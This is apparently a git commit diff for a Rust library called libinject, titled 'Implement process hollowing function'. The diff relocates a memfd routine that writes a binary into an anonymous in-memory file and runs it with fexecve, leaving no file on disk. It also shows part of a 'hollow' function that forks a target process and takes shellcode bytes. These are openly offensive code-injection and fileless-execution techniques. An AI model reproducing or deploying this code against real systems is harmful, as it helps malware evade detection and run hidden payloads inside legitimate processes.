dd421c518267e390587c19611fa2bcb9bfa4e2ef
dustyw0lf <dustyw0lf@users.noreply.github.com>
2024-10-11 15:38:29 +0300

    Implement process hollowing function

--- libinject/src/core.rs
+++ libinject/src/core.rs
@@ -10,27 +10,6 @@ use nix::unistd::{execve, fexecve, fork, ForkResult};
 use std::ffi::{c_void, CString};
 use std::os::fd::AsRawFd;
 
-pub fn memfd(binary_name: &str, args: &str, binary_bytes: &[u8]) -> Result<(), Errno> {
-    let anon_file_name = CString::new("").unwrap();
-    let p_file_name = anon_file_name.as_c_str();
-
-    let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;
-
-    unistd::write(&fd, binary_bytes)?;
-
-    let mut parsed_binary = str_to_vec_c_string(binary_name);
-    let mut parsed_args = str_to_vec_c_string(args);
-    parsed_binary.append(&mut parsed_args);
-    let parsed_binary_as_slice = parsed_binary.as_slice();
-
-    let env = get_env();
-    let env_as_slice = env.as_slice();
-
-    fexecve(fd.as_raw_fd(), parsed_binary_as_slice, env_as_slice)?;
-
-    Ok(())
-}
-
 pub fn hollow(target: &str, args: &str, shellcode_bytes: &[u8]) -> Result<(), Errno> {
     match unsafe { fork() } {
         Ok(ForkResult::Parent { child, .. }) => {
@@ -64,6 +43,27 @@ pub fn hollow(target: &str, args: &str, shellcode_bytes: &[u8]) -> Result<(), Er
 
         Err(error) => println!("Fork failed: {}", error),
     }
+
+    Ok(())
+}
+
+pub fn memfd(binary_name: &str, args: &str, binary_bytes: &[u8]) -> Result<(), Errno> {
+    let anon_file_name = CString::new("").unwrap();
+    let p_file_name = anon_file_name.as_c_str();
+
+    let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;
+
+    unistd::write(&fd, binary_bytes)?;
+
+    let mut parsed_binary = str_to_vec_c_string(binary_name);
+    let mut parsed_args = str_to_vec_c_string(args);
+    parsed_binary.append(&mut parsed_args);
+    let parsed_binary_as_slice = parsed_binary.as_slice();
+
+    let env = get_env();
+    let env_as_slice = env.as_slice();
+
+    fexecve(fd.as_raw_fd(), parsed_binary_as_slice, env_as_slice)?;
 
     Ok(())
 }
